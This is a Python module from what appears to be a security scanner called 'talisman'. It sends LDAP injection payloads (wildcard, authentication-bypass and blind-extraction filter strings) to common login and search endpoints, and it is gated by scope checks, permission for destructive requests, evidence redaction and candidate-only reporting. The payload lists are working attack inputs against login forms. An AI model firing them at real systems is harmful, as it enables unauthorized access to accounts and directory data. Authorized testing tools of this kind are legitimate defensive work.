"""LDAP Injection scanner — wildcard enumeration, authentication bypass, blind extraction."""
from __future__ import annotations
import asyncio
import random
import string
from typing import Any
from talisman.engine.scope import ScopeViolationError
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.redaction import redact_sensitive_text
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

LDAP_CANARY_PREFIX = "TLSMLDAP"

LDAP_ENDPOINTS = [
    "/login", "/api/login", "/auth", "/api/auth",
    "/authenticate", "/api/authenticate",
    "/search", "/api/search", "/api/users/search",
    "/ldap", "/api/ldap",
    "/user/search", "/api/user/search",
    "/employees", "/api/employees",
]

LDAP_WILDCARD_PAYLOADS = [
    ("*", "Wildcard injection"),
    ("*)(uid=*", "Wildcard with group close"),
    ("*)(|(uid=*", "OR-based wildcard"),
    ("*))(|(uid=*", "Double close + OR wildcard"),
    ("*)(cn=*", "CN wildcard injection"),
]

LDAP_AUTH_BYPASS_PAYLOADS = [
    ("*)(uid=*))(|(uid=*", "Classic auth bypass"),
    ("*)(uid=*", "Simple auth bypass"),
    ("*))(|(uid=*", "Auth bypass double close"),
    ("*)(|(uid=*", "OR injection bypass"),
    ("*)(&(uid=*", "AND injection bypass"),
]

LDAP_BLIND_PAYLOADS = [
    ("*)(uid=a*", "Blind a-prefix"),
    ("*)(uid=b*", "Blind b-prefix"),
    ("*)(uid=admin*", "Blind admin-prefix"),
    ("*)(cn=*", "CN attribute injection"),
]


async def _test_wildcard_injection(
    url: str, endpoint: str, client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    """Test wildcard injection in LDAP search filters.

    Sending * as a parameter value may return all LDAP entries.
    Compare response size/content with a normal request for detection.
    """
    findings: list[dict[str, Any]] = []
    test_url = url.rstrip("/") + endpoint
    canary = f"{LDAP_CANARY_PREFIX}{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"

    # Step 1: Baseline request with a unique value
    try:
        r_baseline = await client.post(test_url,
            json={"username": canary, "password": "test"},
            headers={"Content-Type": "application/json"}, timeout=8)
        baseline_len = len(r_baseline.text)
    except Exception:
        baseline_len = 0

    # Step 2: Test each wildcard payload
    for payload, description in LDAP_WILDCARD_PAYLOADS:
        try:
            r = await client.post(test_url,
                json={"username": payload, "password": "test"},
                headers={"Content-Type": "application/json"}, timeout=8)

            resp_len = len(r.text)

            # Wildcard injection often returns more data or different status
            if resp_len > baseline_len * 2 or resp_len > 1000:
                findings.append({
                    "type": "ldap_wildcard",
                    "endpoint": endpoint,
                    "payload": payload,
                    "description": description,
                    "baseline_length": baseline_len,
                    "response_length": resp_len,
                    "status": r.status_code,
                    "evidence": r.text[:300],
                    "canary": canary,
                })
                break

            # Also check for LDAP error messages
            resp_lower = r.text.lower()
            if any(ind in resp_lower for ind in ["ldap", "directory", "distinguished", "cn=", "dc=", "ou="]):
                findings.append({
                    "type": "ldap_error_reflection",
                    "endpoint": endpoint,
                    "payload": payload,
                    "evidence": r.text[:400],
                    "canary": canary,
                })
                break
        except Exception:
            pass

    return findings


async def _test_auth_bypass(
    url: str, endpoint: str, client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    """Test LDAP authentication bypass via always-true filters."""
    findings: list[dict[str, Any]] = []
    test_url = url.rstrip("/") + endpoint
    canary = f"{LDAP_CANARY_PREFIX}{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"

    for payload, description in LDAP_AUTH_BYPASS_PAYLOADS:
        try:
            r = await client.post(test_url,
                json={"username": payload, "password": payload},
                headers={"Content-Type": "application/json"}, timeout=8)

            # Auth bypass typically returns 200 OK with session/token
            if r.status_code in (200, 201, 204, 302):
                resp_lower = r.text.lower()
                auth_indicators = ["token", "session", "logged", "welcome", "authenticated", "bearer"]
                if any(ind in resp_lower for ind in auth_indicators):
                    findings.append({
                        "type": "ldap_auth_bypass",
                        "endpoint": endpoint,
                        "payload": payload,
                        "description": description,
                        "status": r.status_code,
                        "evidence": r.text[:300],
                        "canary": canary,
                    })
                    break

                # Even without explicit auth indicators, a 200 on malformed input is suspicious
                if r.status_code == 200:
                    findings.append({
                        "type": "ldap_auth_bypass_suspicious",
                        "endpoint": endpoint,
                        "payload": payload,
                        "description": f"Suspicious: {description} returned {r.status_code}",
                        "status": r.status_code,
                        "evidence": r.text[:200],
                        "canary": canary,
                    })
                    break
        except Exception:
            pass

    return findings


async def _test_blind_ldap(
    url: str, endpoint: str, client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    """Test blind LDAP injection via differential analysis."""
    findings: list[dict[str, Any]] = []
    test_url = url.rstrip("/") + endpoint

    # Compare responses between two similar payloads
    # If they differ, character-by-character extraction is possible
    responses: dict[str, tuple[int, str]] = {}

    for payload, description in LDAP_BLIND_PAYLOADS:
        try:
            r = await client.post(test_url,
                json={"username": payload, "password": "test"},
                headers={"Content-Type": "application/json"}, timeout=8)
            responses[payload] = (r.status_code, r.text[:200])
        except Exception:
            pass

    if len(responses) >= 2:
        unique_responses = set((s, t) for s, t in responses.values())
        if len(unique_responses) > 1:
            # Different payloads produce different responses — blind injection possible
            details = []
            for payload, (status, text) in responses.items():
                details.append(f"{payload[:30]} -> {status} / {len(text)} bytes")
            findings.append({
                "type": "ldap_blind_injection",
                "endpoint": endpoint,
                "evidence": " | ".join(details),
                "description": "Blind LDAP injection possible — different wildcard patterns return different responses",
            })

    return findings


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    """Run LDAP probes only after explicit destructive permission; never auto-confirm."""
    url = target if "://" in target else f"https://{target}"
    if scope is None:
        return {
            "target": url, "findings": [], "candidates": [], "count": 0,
            "candidate_count": 0, "error": "scope_enforcer_required",
        }
    scope.assert_in_scope(url)

    try:
        scope.assert_destructive_allowed(url, "POST")
    except ScopeViolationError as exc:
        return {
            "target": url,
            "findings": [],
            "candidates": [],
            "count": 0,
            "candidate_count": 0,
            "skipped": True,
            "reason": str(exc),
        }

    console.print(
        f"\n[module][+] LDAP Injection Candidate Scanner[/module] -> [target]{url}[/target]"
    )
    candidates: list[dict[str, Any]] = []
    async with TalismanHTTPClient(proxy=proxy, timeout=12, scope=scope) as client:
        for endpoint in LDAP_ENDPOINTS:
            checks = (
                await _test_wildcard_injection(url, endpoint, client)
                + await _test_auth_bypass(url, endpoint, client)
                + await _test_blind_ldap(url, endpoint, client)
            )
            for item in checks:
                safe_item = redact_sensitive_text(str(item.get("evidence", ""))[:400])
                candidates.append({
                    **item,
                    "evidence": safe_item,
                    "confidence": "candidate",
                    "requires_controlled_validation": True,
                    "verification_required": (
                        "Use a disposable LDAP-backed test application and known "
                        "test identities. Establish a benign baseline, show the "
                        "LDAP filter interpretation changed, and verify access to "
                        "a resource the test identity is not authorized to access. "
                        "HTTP 200, response-length changes, LDAP words, or reflected "
                        "strings alone do not prove injection or authentication bypass."
                    ),
                })

    console.print(
        f"  LDAP scan complete -- {len(candidates)} candidates; "
        "no access-control impact inferred automatically"
    )
    return {
        "target": url,
        "findings": [],
        "candidates": candidates,
        "count": 0,
        "candidate_count": len(candidates),
        "post_probes_enabled": True,
    }
